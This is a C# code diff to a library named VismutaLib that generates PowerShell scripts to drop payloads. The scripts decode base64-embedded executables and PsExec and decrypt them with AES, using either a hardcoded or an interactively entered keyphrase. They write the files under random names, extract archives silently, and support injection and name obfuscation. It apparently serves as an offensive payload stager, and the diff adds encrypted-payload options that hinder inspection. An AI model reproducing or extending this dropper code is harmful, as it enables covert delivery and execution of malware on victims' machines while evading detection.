@@ -37,11 +37,15 @@ namespace VismutaLib
             String execName = GetRandomString(RandomFilenameLength, false);
             Byte[] execBinary = Convert.FromBase64String(Resources.ExecEncoded); //TODO: Take out redundant steps
 
+            //Sanity Check
+            if (deployFlags.HasFlag(DeployMethodFlags.EncryptInteractive) && deployFlags.HasFlag(DeployMethodFlags.EncryptNonInteractive))
+                throw new InvalidOperationException("Interactive encryption or non-interactive encryption. Pick one.");
+
             //Deploy PSExec
             if (deployFlags.HasFlag(DeployMethodFlags.PsExec))
             {
                 //Encrypt PSExec
-                if (deployFlags.HasFlag(DeployMethodFlags.EncryptPayload))
+                if (deployFlags.HasFlag(DeployMethodFlags.EncryptInteractive) || deployFlags.HasFlag(DeployMethodFlags.EncryptNonInteractive))
                 {
                     if (String.IsNullOrWhiteSpace(keyphrase))
                         throw new ArgumentException(nameof(keyphrase));
@@ -56,14 +60,22 @@ namespace VismutaLib
                 dstShell += "[byte[]] $exec = [System.Convert]::FromBase64String($execEncoded); " + CRLF;
 
                 //Decrypt PSExec
-                if (deployFlags.HasFlag(DeployMethodFlags.EncryptPayload))
+                if (deployFlags.HasFlag(DeployMethodFlags.EncryptNonInteractive))
+                {
+                    dstShell += "[string] $keyphrase = " + keyphrase + ";" + CRLF;
                     dstShell += Resources.AES256Decrypt.Replace(Environment.NewLine, CRLF).Replace("[[PAYLOAD]]", "$exec") + CRLF;
+                }
+                else if (deployFlags.HasFlag(DeployMethodFlags.EncryptInteractive))
+                {
+                    dstShell += "[string] $keyphrase = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($inputkey));" + CRLF;
+                    dstShell += Resources.AES256Decrypt.Replace(Environment.NewLine, CRLF).Replace("[[PAYLOAD]]", "$exec") + CRLF;
+                }
 
                 dstShell += $"[System.IO.File]::WriteAllBytes($cwd+\"\\{execName}.exe\", $exec); " + CRLF;
             }
 
             //Encrypt Payload
-            if (deployFlags.HasFlag(DeployMethodFlags.EncryptPayload))
+            if (deployFlags.HasFlag(DeployMethodFlags.EncryptInteractive) || deployFlags.HasFlag(DeployMethodFlags.EncryptNonInteractive))
             {
                 if (String.IsNullOrWhiteSpace(keyphrase))
                     throw new ArgumentException(nameof(keyphrase));
@@ -79,8 +91,16 @@ namespace VismutaLib
             dstShell += "[byte[]] $payload = [System.Convert]::FromBase64String($payloadEncoded); " + CRLF;
 
             //Decrypt Payload
-            if (deployFlags.HasFlag(DeployMethodFlags.EncryptPayload))
+            if (deployFlags.HasFlag(DeployMethodFlags.EncryptNonInteractive))
+            {
+                dstShell += "[string] $keyphrase = \"" + keyphrase + "\";" + CRLF;
                 dstShell += Resources.AES256Decrypt.Replace(Environment.NewLine, CRLF).Replace("[[PAYLOAD]]", "$payload") + CRLF;
+            }
+            else if (deployFlags.HasFlag(DeployMethodFlags.EncryptInteractive))
+            {
+                dstShell += "[string] $keyphrase = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($inputkey));" + CRLF;
+                dstShell += Resources.AES256Decrypt.Replace(Environment.NewLine, CRLF).Replace("[[PAYLOAD]]", "$payload") + CRLF;
+            }
 
             if (deployFlags.HasFlag(DeployMethodFlags.Inject))
             {
@@ -112,8 +132,17 @@ namespace VismutaLib
             //Unzip Payload
             if (deployFlags.HasFlag(DeployMethodFlags.Deflate))
             {
-                dstShell += "Add-Type -AssemblyName System.IO.Compression.FileSystem; " + CRLF;
-                dstShell += $"[System.IO.Compression.ZipFile]::ExtractToDirectory($cwd+\"\\{payloadName}{payloadExt}\", \".\"); " + CRLF;
+                //This method is undesirable as it requires PSv3
+                //dstShell += "Add-Type -AssemblyName System.IO.Compression; " + CRLF;
+                //dstShell += $"[System.IO.Compression.ZipFile]::ExtractToDirectory($cwd+\"\\{payloadName}{payloadExt}\", \".\"); " + CRLF;
+
+                //https://msdn.microsoft.com/en-us/library/windows/desktop/bb787866%28v=vs.85%29.aspx
+                const Int32 doNotDisplayProgress = 4;
+                const Int32 respondYesToAll = 16;
+                const Int32 ignoreError = 1024;
+                const Int32 zipFlags = respondYesToAll | doNotDisplayProgress | ignoreError;
+                dstShell += "$shell = New-Object -com Shell.Application; " + CRLF;
+                dstShell += $"$shell.NameSpace($cwd).CopyHere($cwd + \"\\{payloadName}{payloadExt}\\*\", {zipFlags});" + CRLF;
             }
 
             //Sanity checks
@@ -171,6 +200,10 @@ namespace VismutaLib
             if (flags.HasFlag(DeployMethodFlags.Inject) && flags.HasFlag(DeployMethodFlags.Deflate))
                 return false;
             if (flags.HasFlag(DeployMethodFlags.Inject) && flags.HasFlag(DeployMethodFlags.ObfuscateName))
+                return false;
+            //No, you can't has all teh encryptions
+            if (flags.HasFlag(DeployMethodFlags.EncryptInteractive) &&
+                flags.HasFlag(DeployMethodFlags.EncryptNonInteractive))
                 return false;
 
             return true;
